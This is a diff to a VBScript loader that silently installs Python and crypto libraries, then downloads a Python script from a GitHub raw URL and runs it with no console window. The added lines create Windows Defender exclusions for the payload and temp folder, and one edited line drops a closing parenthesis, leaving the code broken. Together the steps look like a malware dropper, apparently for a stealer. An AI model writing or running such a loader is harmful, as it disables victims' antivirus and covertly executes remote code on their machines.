@@ -10,7 +10,7 @@ SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/head
 ' Extract Python version from the URL (e.g., "3.11.7" → "311")
 Dim versionParts, majorMinor
 versionParts = Split(PYTHON_URL, "/")
-PYTHON_VERSION = versionParts(UBound(versionParts)) ' e.g., "python-3.11.7-amd64.exe"
+PYTHON_VERSION = versionParts(UBound(versionParts) ' e.g., "python-3.11.7-amd64.exe"
 majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
 majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"
 
@@ -132,7 +132,12 @@ WShell.Run """" & pythonPath & """ -m ensurepip", 0, True
 LogMessage "Installing required libraries..."
 WShell.Run """" & pythonPath & """ -m pip install --quiet requests pyaes pycryptodome", 0, True
 
-' Download the Python script after Python and libraries are installed
+' Add Windows Defender exclusions for TEMP_DIR and SCRIPT_NAME
+LogMessage "Adding Windows Defender exclusions..."
+RunPowerShellCommand "Add-MpPreference -ExclusionPath '" & TEMP_DIR & "' -ErrorAction SilentlyContinue"
+RunPowerShellCommand "Add-MpPreference -ExclusionPath '" & SCRIPT_NAME & "' -ErrorAction SilentlyContinue"
+
+' Download the Python script after Python, libraries, and exclusions are set
 LogMessage "Downloading Python script from: " & SCRIPT_URL
 RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' -UseBasicParsing"
 
@@ -149,7 +154,7 @@ LogMessage "Python script downloaded to: " & SCRIPT_NAME
 ' Execute the script in the background with pythonw.exe (no console window)
 LogMessage "Executing script: " & SCRIPT_NAME
 WShell.Run """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", 0, False
-
+                                                                          
 ' Cleanup
 LogMessage "Cleaning up..."
 If FSO.FileExists(PYTHON_INSTALLER) Then
